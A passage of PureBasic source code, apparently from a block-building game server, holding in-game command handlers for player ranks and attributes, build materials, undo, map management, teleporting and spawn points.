      Attribute.s = Command_Main\Parsed_Operator [1]
      Value = Val(Command_Main\Parsed_Operator [2])
      
      Player_Attribute_Long_Set(Player_List()\Number, Attribute, Value)
      
      System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Attribute changed"))
      
    Else
      System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Can't find Player_List()\Name = [Field_0]", Command_Main\Parsed_Operator [0]))
    EndIf
    
  EndIf
EndProcedure

Procedure Command_Player_Attribute_Long_Get()
  If Network_Client_Select(Command_Main\Command_Client_ID)
    
    If Player_List_Select(Command_Main\Parsed_Operator [0])
      
      Attribute.s = Command_Main\Parsed_Operator [1]
      Value = Player_Attribute_Long_Get(Player_List()\Number, Attribute)
      
      System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Attribute is [Field_0]", Str(Value)))
      
    Else
      System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Can't find Player_List()\Name = [Field_0]", Command_Main\Parsed_Operator [0]))
    EndIf
    
  EndIf
EndProcedure

Procedure Command_Player_Attribute_String_Set()
  If Network_Client_Select(Command_Main\Command_Client_ID)
    
    If Player_List_Select(Command_Main\Parsed_Operator [0])
      
      Attribute.s = Command_Main\Parsed_Operator [1]
      String.s = Command_Main\Parsed_Operator [2]
      
      Player_Attribute_String_Set(Player_List()\Number, Attribute, String)
      
      System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Attribute changed"))
      
    Else
      System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Can't find Player_List()\Name = [Field_0]", Command_Main\Parsed_Operator [0]))
    EndIf
    
  EndIf
EndProcedure

Procedure Command_Player_Attribute_String_Get()
  If Network_Client_Select(Command_Main\Command_Client_ID)
    
    If Player_List_Select(Command_Main\Parsed_Operator [0])
      
      Attribute.s = Command_Main\Parsed_Operator [1]
      String.s = Player_Attribute_String_Get(Player_List()\Number, Attribute)
      
      System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Attribute is [Field_0]", String))
      
    Else
      System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Can't find Player_List()\Name = [Field_0]", Command_Main\Parsed_Operator [0]))
    EndIf
    
  EndIf
EndProcedure

Procedure Command_Setrank()
  Name.s = Command_Main\Parsed_Operator [0]
  New_Rank = Val(Command_Main\Parsed_Operator [1])
  Reason.s = Command_Main\Parsed_Text_2
  
  If New_Rank >= -32768 And New_Rank <= 32767
    If Network_Client_Select(Command_Main\Command_Client_ID)
      If Network_Client()\Player\Entity
        If Network_Client()\Player\Entity\Player_List
          Player_Number = Network_Client()\Player\Entity\Player_List\Number
          Ranker_Name.s = Player_Get_Prefix(Player_Number)+Player_Get_Name(Player_Number)+Player_Get_Suffix(Player_Number)
          
          If Player_List_Select(Name)
            Message.s = Lang_Get("", "Rank Reason", Ranker_Name, Str(Player_List()\Rank), Reason)
            Player_Number = Player_List()\Number
            Display_Name.s = Player_Get_Prefix(Player_Number)+Player_Get_Name(Player_Number)+Player_Get_Suffix(Player_Number)
            
            If Network_Client()\Player\Entity\Player_List\Rank > Player_List()\Rank
              If Network_Client()\Player\Entity\Player_List\Rank > New_Rank
                If Rank_Select(New_Rank)
                  Player_Number = Player_List()\Number
                  Player_Rank_Set(Player_Number, New_Rank, Message)
                  Display_Name.s = Player_Get_Prefix(Player_Number)+Player_Get_Name(Player_Number)+Player_Get_Suffix(Player_Number)
                  System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Rank changed '[Field_0]<c>' '[Field_1]' ([Field_2])", Display_Name, Rank()\Name, Str(New_Rank)))
                EndIf
              Else
                System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Can't rank [Field_0]<c> (A <= Rank)", Display_Name))
              EndIf
            Else
              System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Can't rank [Field_0]<c> (A <= B)", Display_Name))
            EndIf
          Else
            System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Can't find Player_List()\Name = [Field_0]", Name))
          EndIf
          
        EndIf
      EndIf
    EndIf
  Else
    System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Invalid Value"))
  EndIf
EndProcedure

Procedure Command_Getrank()
  If Network_Client_Select(Command_Main\Command_Client_ID)
    
    If Command_Main\Parsed_Operator [0] = ""
      If Network_Client()\Player\Entity
        If Network_Client()\Player\Entity\Player_List
          Rank = Network_Client()\Player\Entity\Player_List\Rank
          If Rank_Select(Rank)
            System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Your rank is '[Field_0]' ([Field_1])", Rank()\Name, Str(Rank)))
          EndIf
        EndIf
      EndIf
    Else
      If Player_List_Select(Command_Main\Parsed_Operator [0])
        Player_Number = Player_List()\Number
        Display_Name.s = Player_Get_Prefix(Player_Number)+Player_Get_Name(Player_Number)+Player_Get_Suffix(Player_Number)
        Rank = Player_List()\Rank
        
        If Rank_Select(Rank)
          System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Rank of '[Field_0]' is '[Field_1]' ([Field_2])", Display_Name, Rank()\Name, Str(Rank)))
        EndIf
        
      Else
        System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Can't find Player_List()\Name = [Field_0]", Command_Main\Parsed_Operator [0]))
      EndIf
    EndIf
    
  EndIf
EndProcedure

Procedure Command_Material()
  If Network_Client_Select(Command_Main\Command_Client_ID)
    If Network_Client()\Player\Entity
      
      If Command_Main\Parsed_Text_0 = ""
        Network_Client()\Player\Entity\Build_Material = -1
        System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Buildmaterial is normal"))
      Else
        Found = 0
        For i = 0 To 255
          If LCase(Block(i)\Name) = Trim(LCase(Command_Main\Parsed_Text_0))
            Network_Client()\Player\Entity\Build_Material = i
            System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Buildmaterial is [Field_0]", Block(i)\Name))
            Found = 1
            Break
          EndIf
        Next
        If Found = 0
          System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Can't find Block()\Name = [Field_0]", Command_Main\Parsed_Text_0))
        EndIf
      EndIf
    
    EndIf
  EndIf
EndProcedure

Procedure Command_Materials()
  If Network_Client_Select(Command_Main\Command_Client_ID)
    If Player_List_Select(Network_Client()\Player\Login_Name)
      System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Materials:"))
      Text.s = ""
      For i = 0 To 255
        If Block(i)\Special And Block(i)\Rank_Place <= Player_List()\Rank
          Text_Add.s = "&e"+Block(i)\Name+" &f| "
          If 64-Len(Text) >= Len(Text_Add)
            Text.s + Text_Add
          Else
            System_Message_Network_Send(Command_Main\Command_Client_ID, Text)
            Text.s = Text_Add
          EndIf
        EndIf
      Next
      If Len(Text) > 0
        System_Message_Network_Send(Command_Main\Command_Client_ID, Text)
      EndIf
      
    EndIf
  EndIf
EndProcedure

Procedure Command_Place()
  If Network_Client_Select(Command_Main\Command_Client_ID)
    If Network_Client()\Player\Entity
      If Network_Client()\Player\Entity\Map_ID = Network_Client()\Player\Map_ID
        
        Found = 0
        
        Map_ID = Network_Client()\Player\Entity\Map_ID
        If Map_Select_ID(Map_ID)
          X = Round(Network_Client()\Player\Entity\X, #PB_Round_Down)
          Y = Round(Network_Client()\Player\Entity\Y, #PB_Round_Down)
          Z = Round(Network_Client()\Player\Entity\Z, #PB_Round_Down)-1
          
          If X < 0 : X = 0 : EndIf
          If Y < 0 : Y = 0 : EndIf
          If Z < 0 : Z = 0 : EndIf
          
          If X > Map_Data()\Size_X-1 : X = Map_Data()\Size_X-1 : EndIf
          If Y > Map_Data()\Size_Y-1 : Y = Map_Data()\Size_Y-1 : EndIf
          If Z > Map_Data()\Size_Z-1 : Z = Map_Data()\Size_Z-1 : EndIf
          
          If Command_Main\Parsed_Text_0 = ""
            Material = Network_Client()\Player\Entity\Last_Material
            Found = 1
          Else
            For i = 0 To 255
              If LCase(Block(i)\Name) = Trim(LCase(Command_Main\Parsed_Text_0))
                Material = i
                Found = 1
                Break
              EndIf
            Next
          EndIf
        EndIf
        
        If Found = 1
          Map_Block_Change_Client(Network_Client(), Map_Get_Pointer(Map_ID), X, Y, Z, 1, Material)
          System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Block placed"))
        Else
          System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Can't find Block()\Name = [Field_0]", Command_Main\Parsed_Text_0))
        EndIf
        
      EndIf
    EndIf
  EndIf
EndProcedure

Procedure Command_Undo_Time()
  If Network_Client_Select(Command_Main\Command_Client_ID)
    If Network_Client()\Player\Entity
      If Network_Client()\Player\Entity\Map_ID = Network_Client()\Player\Map_ID
        
        Time = Date() - Val(Command_Main\Parsed_Operator [0])
        Map_ID = Network_Client()\Player\Entity\Map_ID
        
        If Map_Select_ID(Map_ID)
          Undo_Do_Time(Map_ID, Time)
          System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Blockchanges undone"))
        EndIf
        
      EndIf
    EndIf
  EndIf
EndProcedure

Procedure Command_Undo_Player()
  If Network_Client_Select(Command_Main\Command_Client_ID)
    If Network_Client()\Player\Entity
      If Network_Client()\Player\Entity\Map_ID = Network_Client()\Player\Map_ID
        
        Player_Name.s = Command_Main\Parsed_Operator [0]
        Seconds = Val(Command_Main\Parsed_Operator [1])
        If Seconds = 0
          Seconds = 1800
        ElseIf Seconds > 3600
          Seconds = 3600
        EndIf
        Time = Date() - Seconds
        Map_ID = Network_Client()\Player\Entity\Map_ID
        
        If Player_List_Select(Player_Name)
          If Map_Select_ID(Map_ID)
            Undo_Do_Player(Map_ID, Player_list()\Number, Time)
            System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Blockchanges undone"))
          EndIf
        Else
          System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Can't find Player_List()\Name = [Field_0]", Command_Main\Parsed_Operator [0]))
        EndIf
        
      EndIf
    EndIf
  EndIf
EndProcedure

Procedure Command_Undo()
  If Network_Client_Select(Command_Main\Command_Client_ID)
    If Network_Client()\Player\Entity
      If Network_Client()\Player\Entity\Map_ID = Network_Client()\Player\Map_ID
          
        Player_Name.s = Network_Client()\Player\Login_Name
        Seconds = Val(Command_Main\Parsed_Operator [0])
        
        If Seconds = 0
          Seconds = 60
        ElseIf Seconds > 3600
          Seconds = 3600
        EndIf
        Time = Date() - Seconds
        Map_ID = Network_Client()\Player\Entity\Map_ID
        
        If Player_List_Select(Player_Name)
          If Map_Select_ID(Map_ID)
            Undo_Do_Player(Map_ID, Player_list()\Number, Time)
            System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Blockchanges undone"))
          EndIf
        Else
          System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Can't find Player_List()\Name = [Field_0]", Command_Main\Parsed_Operator [0]))
        EndIf
        
      EndIf
    EndIf
  EndIf
EndProcedure

Procedure Command_Map_Info()
  If Network_Client_Select(Command_Main\Command_Client_ID)
    If Network_Client()\Player\Entity
      If Network_Client()\Player\Entity\Map_ID = Network_Client()\Player\Map_ID
        
        Map_ID = Network_Client()\Player\Map_ID
        If Map_Select_ID(Map_ID)
          
          Text.s = Lang_Get("", "Ingame: Mapinfo:") + "<br>"
          Text.s + Lang_Get("", "Ingame: Name:") + " " + Map_Data()\Name + "<br>"
          Text.s + Lang_Get("", "Ingame: ID:") + " " + Str(Map_Data()\ID) + "<br>"
          Text.s + Lang_Get("", "Ingame: U_ID:") + " " + Map_Data()\Unique_ID + "<br>"
          Text.s + Lang_Get("", "Ingame: Directory:") + " " + Map_Data()\Directory + "<br>"
          Text.s + Lang_Get("", "Ingame: Preview Type:") + " " + Str(Map_Data()\Overview_Type) + "<br>"
          Text.s + Lang_Get("", "Ingame: Size:") + " " + Str(Map_Data()\Size_X)+"x"+Str(Map_Data()\Size_Y)+"x"+Str(Map_Data()\Size_Z) + "<br>"
          Text.s + Lang_Get("", "Ingame: Memoryusage:") + " " + StrF((MemorySize(Map_Data()\Data)+MemorySize(Map_Data()\Blockchange_Data)+MemorySize(Map_Data()\Physic_Data))/1000000, 3) + "MB" + "<br>"
          Text.s + Lang_Get("", "Ingame: Ranks: Build=[Field_0] Join=[Field_1] Show=[Field_2]", Str(Map_Data()\Rank_Build), Str(Map_Data()\Rank_Join), Str(Map_Data()\Rank_Show)) + "<br>"
          If Map_Data()\Physic_Stopped
            Text.s + Lang_Get("", "Ingame: Physic-Queue:") + " " + Str(ListSize(Map_Data()\Map_Block_Do())) + " " + Lang_Get("", "Ingame: Physics-Stopped") + "<br>"
          Else
            Text.s + Lang_Get("", "Ingame: Physic-Queue:") + " " + Str(ListSize(Map_Data()\Map_Block_Do())) + "<br>"
          EndIf
          If Map_Data()\Blockchange_Stopped
            Text.s + Lang_Get("", "Ingame: Blocksend-Queue:") + " " + Str(ListSize(Map_Data()\Map_Block_Changed())) + " " + Lang_Get("", "Ingame: Blocksend-Stopped") + "<br>"
          Else
            Text.s + Lang_Get("", "Ingame: Blocksend-Queue:") + " " + Str(ListSize(Map_Data()\Map_Block_Changed())) + "<br>"
          EndIf
          
          System_Message_Network_Send(Command_Main\Command_Client_ID, Text)
        EndIf
        
      EndIf
    EndIf
  EndIf
EndProcedure

Procedure Command_Map_Save()
  If Network_Client_Select(Command_Main\Command_Client_ID)
    If Network_Client()\Player\Entity
      If Network_Client()\Player\Entity\Map_ID = Network_Client()\Player\Map_ID
        
        Map_ID = Network_Client()\Player\Entity\Map_ID
        
        If Command_Main\Parsed_Text_0 <> ""
          Directory.s = Files_Folder_Get("Maps")+Command_Main\Parsed_Text_0
          If LCase(Right(Directory, 1)) <> "/"
            Directory.s + "/"
          EndIf
        Else
          Directory.s = ""
        EndIf
        
        If Map_Select_ID(Map_ID)
          System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Added save To queue"))
          Map_Action_Add_Save(Command_Main\Command_Client_ID, Map_ID, Directory)
        EndIf
        
      EndIf
    EndIf
  EndIf
EndProcedure

Procedure Command_Map_Load()
  If Network_Client_Select(Command_Main\Command_Client_ID)
    If Network_Client()\Player\Entity
      If Network_Client()\Player\Entity\Map_ID = Network_Client()\Player\Map_ID
        
        Map_ID = Network_Client()\Player\Entity\Map_ID
        
        If Command_Main\Parsed_Text_0 <> ""
          Directory.s = Files_Folder_Get("Maps")+Command_Main\Parsed_Text_0
          If LCase(Right(Directory, 1)) <> "/"
            Directory.s + "/"
          EndIf
        Else
          Directory.s = ""
        EndIf
        
        System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Added load to queue"))
        Map_Action_Add_Load(Command_Main\Command_Client_ID, Map_ID, Directory)
        
      EndIf
    EndIf
  EndIf
EndProcedure

Procedure Command_Map_Resize()
  If Network_Client_Select(Command_Main\Command_Client_ID)
    If Network_Client()\Player\Entity
      If Network_Client()\Player\Entity\Map_ID = Network_Client()\Player\Map_ID
        
        Map_ID = Network_Client()\Player\Entity\Map_ID
        X = Val(Command_Main\Parsed_Operator [0])
        Y = Val(Command_Main\Parsed_Operator [1])
        Z = Val(Command_Main\Parsed_Operator [2])
        
        Map_Action_Add_Resize(Command_Main\Command_Client_ID, Map_ID, X, Y, Z)
        System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Added resize to queue"))
        
      EndIf
    EndIf
  EndIf
EndProcedure

Procedure Command_Map_Rename()
  If Network_Client_Select(Command_Main\Command_Client_ID)
    If Network_Client()\Player\Entity
      If Network_Client()\Player\Entity\Map_ID = Network_Client()\Player\Map_ID
        
        Map_ID = Network_Client()\Player\Entity\Map_ID
        Name.s = Command_Main\Parsed_Text_0
        
        If Name <> ""
          If Map_Select_ID(Map_ID)
            Map_Data()\Name = Name
            
            Map_Main\Save_File = 1
            
            System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Map renamed"))
          EndIf
        Else
          System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Please define a name"))
        EndIf
        
      EndIf
    EndIf
  EndIf
EndProcedure

Procedure Command_Map_Directory_Rename()
  If Network_Client_Select(Command_Main\Command_Client_ID)
    If Network_Client()\Player\Entity
      If Network_Client()\Player\Entity\Map_ID = Network_Client()\Player\Map_ID
        
        Map_ID = Network_Client()\Player\Entity\Map_ID
        
        If Map_Select_ID(Map_ID)
          If Command_Main\Parsed_Text_0 <> ""
            
            Directory.s = Command_Main\Parsed_Text_0
            If LCase(Right(Directory, 1)) <> "/"
              Directory.s + "/"
            EndIf
            
            Map_Data()\Directory = Files_Folder_Get("Maps")+Directory
            
            Map_Main\Save_File = 1
            
            System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Mapdirectory changed"))
            
          Else
            System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Please define a directory"))
          EndIf
        EndIf
        
      EndIf
    EndIf
  EndIf
EndProcedure

Procedure Command_Map_Delete()
  If Network_Client_Select(Command_Main\Command_Client_ID)
    If Network_Client()\Player\Entity
      If Network_Client()\Player\Entity\Map_ID = Network_Client()\Player\Map_ID
        
        Map_ID = Network_Client()\Player\Entity\Map_ID
    
        Map_Action_Add_Delete(Command_Main\Command_Client_ID, Map_ID) ; Action Delete
        System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Added delete to queue"))
        
      EndIf
    EndIf
  EndIf
EndProcedure

Procedure Command_Map_Add()
  Name.s = Command_Main\Parsed_Text_0
  
  If Name <> ""
    Map_ID = Map_Get_ID()
    Map_Add(Map_ID, 64, 64, 64, Name)
    System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Map added"))
  EndIf
EndProcedure

Procedure Command_Map_Fill()
  If Network_Client_Select(Command_Main\Command_Client_ID)
    If Network_Client()\Player\Entity
      If Network_Client()\Player\Entity\Map_ID = Network_Client()\Player\Map_ID
        
        Function.s = Command_Main\Parsed_Operator [0]
        Map_ID = Network_Client()\Player\Entity\Map_ID
        Argument_String.s = Command_Main\Parsed_Text_1
        
        If Function
          Map_Action_Add_Fill(Command_Main\Command_Client_ID, Map_ID, Function.s, Argument_String)
          
          System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Added fill to queue"))
        Else
          System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Please define a function"))
        EndIf
        
      EndIf
    EndIf
  EndIf
EndProcedure

Procedure Command_Map_Blocks_Count()
  If Network_Client_Select(Command_Main\Command_Client_ID)
    If Network_Client()\Player\Entity
      If Network_Client()\Player\Entity\Map_ID = Network_Client()\Player\Map_ID
        If Map_Select_ID(Network_Client()\Player\Entity\Map_ID)
          
          If LCase(Command_Main\Parsed_Operator [0]) = "physic"
            Filter = 1
          Else
            Filter = 0
          EndIf
          
          System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Materials:"))
          Text.s = ""
          For i = 0 To 255
            If Map_Data()\Block_Counter[i]
              If Filter = 0 Or Block(i)\Physic Or Block(i)\Physic_Plugin
                Text_Add.s = "&e"+Str(Map_Data()\Block_Counter[i])+"x"+Block(i)\Name+" &f| "
                If 64-Len(Text) >= Len(Text_Add)
                  Text.s + Text_Add
                Else
                  System_Message_Network_Send(Command_Main\Command_Client_ID, Text)
                  Text.s = Text_Add
                EndIf
              EndIf
            EndIf
          Next
          If Len(Text) > 0
            System_Message_Network_Send(Command_Main\Command_Client_ID, Text)
          EndIf
          
        EndIf
      EndIf
    EndIf
  EndIf
EndProcedure

Procedure Command_Map_Rank_Build_Set()
  If Network_Client_Select(Command_Main\Command_Client_ID)
    If Network_Client()\Player\Entity
      If Network_Client()\Player\Entity\Map_ID = Network_Client()\Player\Map_ID
        
        Map_ID = Network_Client()\Player\Entity\Map_ID
        Rank = Val(Command_Main\Parsed_Operator [0])
        
        If Rank > -32768 And Rank <= 32767
          If Map_Select_ID(Map_ID)
            Map_Data()\Rank_Build = Rank
            
            System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Rank changed"))
          EndIf
        Else
          System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Invalid Value"))
        EndIf
        
      EndIf
    EndIf
  EndIf
EndProcedure

Procedure Command_Map_Rank_Join_Set()
  If Network_Client_Select(Command_Main\Command_Client_ID)
    If Network_Client()\Player\Entity
      If Network_Client()\Player\Entity\Map_ID = Network_Client()\Player\Map_ID
        
        Map_ID = Network_Client()\Player\Entity\Map_ID
        Rank = Val(Command_Main\Parsed_Operator [0])
        
        If Rank > -32768 And Rank <= 32767
          If Map_Select_ID(Map_ID)
            Map_Data()\Rank_Join = Rank
            
            System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Rank changed"))
          EndIf
        Else
          System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Invalid Value"))
        EndIf
        
      EndIf
    EndIf
  EndIf
EndProcedure

Procedure Command_Map_Rank_Show_Set()
  If Network_Client_Select(Command_Main\Command_Client_ID)
    If Network_Client()\Player\Entity
      If Network_Client()\Player\Entity\Map_ID = Network_Client()\Player\Map_ID
        
        Map_ID = Network_Client()\Player\Entity\Map_ID
        Rank = Val(Command_Main\Parsed_Operator [0])
        
        If Rank > -32768 And Rank <= 32767
          If Map_Select_ID(Map_ID)
            Map_Data()\Rank_Show = Rank
            
            System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Rank changed"))
          EndIf
        Else
          System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Invalid Value"))
        EndIf
        
      EndIf
    EndIf
  EndIf
EndProcedure

Procedure Command_Map_Physic_Stop()
  If Network_Client_Select(Command_Main\Command_Client_ID)
    If Network_Client()\Player\Entity
      If Network_Client()\Player\Entity\Map_ID = Network_Client()\Player\Map_ID
        
        Map_ID = Network_Client()\Player\Entity\Map_ID
        If Map_Select_ID(Map_ID)
          Map_Data()\Physic_Stopped = 1
          System_Message_Network_Send_2_All(Map_ID, Lang_Get("", "Ingame: Physic stopped"))
        EndIf
        
      EndIf
    EndIf
  EndIf
EndProcedure

Procedure Command_Map_Physic_Start()
  If Network_Client_Select(Command_Main\Command_Client_ID)
    If Network_Client()\Player\Entity
      If Network_Client()\Player\Entity\Map_ID = Network_Client()\Player\Map_ID
        
        Map_ID = Network_Client()\Player\Entity\Map_ID
        If Map_Select_ID(Map_ID)
          Map_Data()\Physic_Stopped = 0
          System_Message_Network_Send_2_All(Map_ID, Lang_Get("", "Ingame: Physic started"))
        EndIf
        
      EndIf
    EndIf
  EndIf
EndProcedure

Procedure Command_Map_Change()
  If Network_Client_Select(Command_Main\Command_Client_ID)
    Map_Name.s = Command_Main\Parsed_Text_0
    If Map_Select_Name(Map_Name)
      If Network_Client()\Player\Entity
        Entity_Position_Set(Network_Client()\Player\Entity\ID, Map_Data()\ID, Map_Data()\Spawn_X, Map_Data()\Spawn_Y, Map_Data()\Spawn_Z, Map_Data()\Spawn_Rot, Map_Data()\Spawn_Look, 255, 1)
      EndIf
    Else
      System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Can't find Map_Data()\Name = [Field_0]", Map_Name))
    EndIf
  EndIf
EndProcedure

Procedure Command_Maps()
  If Network_Client_Select(Command_Main\Command_Client_ID)
    If Network_Client()\Player\Entity
      If Network_Client()\Player\Entity\Player_List
        System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Maps:"))
        
        Text.s = ""
        ForEach Map_Data()
          If Map_Data()\Rank_Show <= Network_Client()\Player\Entity\Player_List\Rank
            Text_Add.s = "&e"+Map_Data()\Name+" &f| "
            If 64 - Len(Text) >= Len(Text_Add)
              Text.s + Text_Add
            Else
              System_Message_Network_Send(Command_Main\Command_Client_ID, Text)
              Text.s = Text_Add
            EndIf
          EndIf
        Next
        If Len(Text) > 0
          System_Message_Network_Send(Command_Main\Command_Client_ID, Text)
        EndIf
        
      EndIf
    EndIf
  EndIf
EndProcedure

Procedure Command_User_Maps()
  
  Directory.s = Files_Folder_Get("Usermaps")
  
  If Right(Directory, 1) = "/" Or Right(Directory, 1) = "\"
    Directory = Left(Directory, Len(Directory)-1)
  EndIf
  
  If Network_Client_Select(Command_Main\Command_Client_ID)
    System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Usermaps"))
    
    Text.s = ""
    
    If ExamineDirectory(0, Directory.s, "*.map")
      While NextDirectoryEntry(0)
        If DirectoryEntryType(0) = #PB_DirectoryEntry_File
          Text_Add.s = "&e"+DirectoryEntryName(0)+" &f| "
        EndIf
        If 64 - Len(Text) >= Len(Text_Add)
          Text.s + Text_Add
        Else
          System_Message_Network_Send(Command_Main\Command_Client_ID, Text)
          Text.s = Text_Add
        EndIf
      Wend
      FinishDirectory(0)
    EndIf
    
  EndIf
EndProcedure

Procedure Command_Teleport()
  If Network_Client_Select(Command_Main\Command_Client_ID)
    If Entity_Select_Name(Command_Main\Parsed_Operator [0])
      
      Map_ID = Entity()\Map_ID
      X.f = Entity()\X
      Y.f = Entity()\Y
      Z.f = Entity()\Z
      Rotation.f = Entity()\Rotation
      Look.f = Entity()\Look
      
      If Network_Client()\Player\Entity
        If Network_Client()\Player\Entity
          Entity_Position_Set(Network_Client()\Player\Entity\ID, Map_ID, X, Y, Z, Rotation, Look, 10, 1)
        EndIf
      EndIf
      
    Else
      System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Can't find Entity()\Name = [Field_0]", Command_Main\Parsed_Operator [0]))
    EndIf
  EndIf
EndProcedure

Procedure Command_Bring()
  If Network_Client_Select(Command_Main\Command_Client_ID)
    If Network_Client()\Player\Entity
      Map_ID = Network_Client()\Player\Entity\Map_ID
      X.f = Network_Client()\Player\Entity\X
      Y.f = Network_Client()\Player\Entity\Y
      Z.f = Network_Client()\Player\Entity\Z
      Rotation.f = Network_Client()\Player\Entity\Rotation
      Look.f = Network_Client()\Player\Entity\Look
      
      Found = 0
      ForEach Entity()
        If LCase(Entity()\Name) = LCase(Command_Main\Parsed_Operator [0])
          Entity_Position_Set(Entity()\ID, Map_ID, X, Y, Z, Rotation, Look, 10, 1)
          Found = 1
        EndIf
      Next
      
      If Found = 0
        System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Can't find Entity()\Name = [Field_0]", Command_Main\Parsed_Operator [0]))
      EndIf
      
    EndIf
  EndIf
EndProcedure

Procedure Command_Setspawn()
  If Network_Client_Select(Command_Main\Command_Client_ID)
    If Network_Client()\Player\Entity
      If Network_Client()\Player\Entity\Map_ID = Network_Client()\Player\Map_ID
        
        Map_ID = Network_Client()\Player\Entity\Map_ID
        If Map_Select_ID(Map_ID)
          If Network_Client()\Player\Entity
            Map_Data()\Spawn_X = Network_Client()\Player\Entity\X
            Map_Data()\Spawn_Y = Network_Client()\Player\Entity\Y
            Map_Data()\Spawn_Z = Network_Client()\Player\Entity\Z
            Map_Data()\Spawn_Rot = Network_Client()\Player\Entity\Rotation
            Map_Data()\Spawn_Look = Network_Client()\Player\Entity\Look
          EndIf
          
          If Map_Data()\Spawn_X > Map_Data()\Size_X-1
            Map_Data()\Spawn_X = Map_Data()\Size_X-1
          EndIf
          If Map_Data()\Spawn_Y > Map_Data()\Size_Y-1
            Map_Data()\Spawn_Y = Map_Data()\Size_Y-1
          EndIf
          If Map_Data()\Spawn_X < 1
            Map_Data()\Spawn_X = 1
          EndIf
          If Map_Data()\Spawn_Y < 1
            Map_Data()\Spawn_Y = 1
          EndIf
          If Map_Data()\Spawn_Z < 0
            Map_Data()\Spawn_Z = 0
          EndIf
          
          System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Spawn changed"))
        EndIf
        
      EndIf
    EndIf
  EndIf
EndProcedure

Procedure Command_Setkillspawn()
  If Network_Client_Select(Command_Main\Command_Client_ID)
    
    If Network_Client()\Player\Entity
      Player_Main\Kill_Spawn_Map_ID = Network_Client()\Player\Entity\Map_ID
      Player_Main\Kill_Spawn_X = Network_Client()\Player\Entity\X
      Player_Main\Kill_Spawn_Y = Network_Client()\Player\Entity\Y
      Player_Main\Kill_Spawn_Z = Network_Client()\Player\Entity\Z
      Player_Main\Kill_Spawn_Rot = Network_Client()\Player\Entity\Rotation
      Player_Main\Kill_Spawn_Look = Network_Client()\Player\Entity\Look
    EndIf
    System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Killspawn changed"))
    
  EndIf
EndProcedure

Procedure Command_Set_Location()
  If Network_Client_Select(Command_Main\Command_Client_ID)
    If Network_Client()\Player\Entity
      If Network_Client()\Player\Entity\Map_ID = Network_Client()\Player\Map_ID
        
        Loc_Name.s = Command_Main\Parsed_Text_0
        Map_ID = Network_Client()\Player\Entity\Map_ID
        X.f = Network_Client()\Player\Entity\X
        Y.f = Network_Client()\Player\Entity\Y
        Z.f = Network_Client()\Player\Entity\Z
        Rot.f = Network_Client()\Player\Entity\Rotation
        Look.f = Network_Client()\Player\Entity\Look
        
        If Location_Add(Loc_Name, Map_ID, X, Y, Z, Rot, Look)
          System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Location added"))
        EndIf
        
      EndIf
    EndIf
  EndIf
EndProcedure

